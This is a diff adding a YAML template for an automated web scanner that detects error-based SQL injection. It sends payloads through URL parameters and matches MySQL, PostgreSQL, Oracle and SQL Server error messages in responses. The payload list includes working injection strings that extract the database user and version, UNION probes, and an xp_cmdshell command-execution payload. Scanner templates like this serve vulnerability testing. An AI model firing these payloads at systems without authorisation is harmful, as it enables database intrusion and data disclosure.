@@ -1,0 +1,84 @@
+# templates/sqli/error-based-sqli.yaml
+id: error-based-sqli
+info:
+  name: Error-Based SQL Injection Detection
+  author: webx-elite
+  severity: critical
+  description: Detects SQL injection vulnerabilities through database error messages
+  tags:
+    - sqli
+    - error-based
+    - database
+    - owasp-top10
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+
+vulnerability_type: sqli
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{sqli_payload}}"
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "SQL.*error"
+          - "mysql.*error"
+          - "Warning.*mysql_.*"
+          - "valid MySQL result"
+          - "PostgreSQL.*ERROR"
+          - "Warning.*pg_.*"
+          - "valid PostgreSQL result"
+          - "ORA-[0-9][0-9][0-9][0-9]"
+          - "Oracle error"
+          - "Oracle.*Driver"
+          - "Warning.*oci_.*"
+          - "Warning.*ora_.*"
+        part: body
+        
+      - type: word
+        words:
+          - "Microsoft OLE DB Provider for ODBC Drivers error"
+          - "Microsoft OLE DB Provider for SQL Server error"
+          - "Incorrect syntax near"
+          - "Unclosed quotation mark after the character string"
+          - "quoted string not properly terminated"
+        part: body
+
+payloads:
+  # MySQL error-based
+  - "'"
+  - "''"
+  - "' OR '1'='1"
+  - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,0x27,CAST(user() AS CHAR),0x27,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1"
+  - "' AND extractvalue(rand(),concat(0x3a,version()))--"
+  - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+  
+  # PostgreSQL error-based
+  - "'; SELECT * FROM generate_series(1,1000); --"
+  - "' AND CAST((SELECT version()) AS int)--"
+  - "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int)--"
+  
+  # Oracle error-based
+  - "' AND (SELECT * FROM (SELECT user FROM dual) WHERE ROWNUM=1 AND user LIKE '%')='1"
+  - "' AND (SELECT COUNT(*) FROM all_users)>0--"
+  - "' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--"
+  
+  # SQL Server error-based
+  - "' AND 1=CONVERT(int,(SELECT @@version))--"
+  - "'; EXEC xp_cmdshell('dir'); --"
+  - "' AND 1=CAST((SELECT @@version) AS int)--"
+  
+  # Generic injection tests
+  - "1' AND '1'='1"
+  - "1' AND '1'='2"
+  - "1 AND 1=1"
+  - "1 AND 1=2"
+  - "' UNION SELECT NULL--"
+
+encoders:
+  - url
+  - double_url
